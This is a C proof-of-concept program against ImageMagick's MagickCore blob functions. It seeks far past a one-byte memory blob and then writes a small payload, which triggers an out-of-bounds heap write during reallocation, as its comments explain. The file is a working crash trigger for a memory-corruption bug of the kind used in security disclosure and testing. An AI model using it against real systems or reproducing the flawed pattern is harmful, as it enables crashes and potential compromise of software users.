// poc.c

#include <stdio.h>
#include <stdlib.h>
#include <MagickCore/MagickCore.h>
#include <MagickCore/blob.h>
#include "MagickCore/blob-private.h"



int main(int argc, char **argv) {
  MagickCoreGenesis(argv[0], MagickTrue);
  ExceptionInfo *e = AcquireExceptionInfo();
  ImageInfo *ii = AcquireImageInfo();
  Image *im = AcquireImage(ii, e);
  if (!im) return 1;

  // 1-byte memory blob → BlobStream
  unsigned char *buf = (unsigned char*) malloc(1);
  buf[0] = 0x41;
  AttachBlob(im->blob, buf, 1); // type=BlobStream, extent=1, offset=0
  SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  // Step 1: write 1 byte (creates BlobInfo + sets offset=1)
  unsigned char A = 0x42;
  (void) WriteBlob(im, 1, &A);
  fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",
          (long long) TellBlob(im), (size_t) GetBlobSize(im));

  // Step 2: seek way past end without growing capacity
  const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB
  (void) SeekBlob(im, big, SEEK_SET);
  fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",
          (long long) TellBlob(im), (size_t) GetBlobSize(im));

  // Step 3: small write → reallocation grows by quantum+length, not to offset+length
  // memcpy then writes to data + offset (OOB)
  const unsigned char payload[] = "PWN";
  (void) WriteBlob(im, sizeof(payload), payload);

  // If we get here, it didn't crash
  fprintf(stderr, "[-] no crash; check ASan flags.\n");

  (void) CloseBlob(im);
  DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);
  MagickCoreTerminus();
  return 0;

}
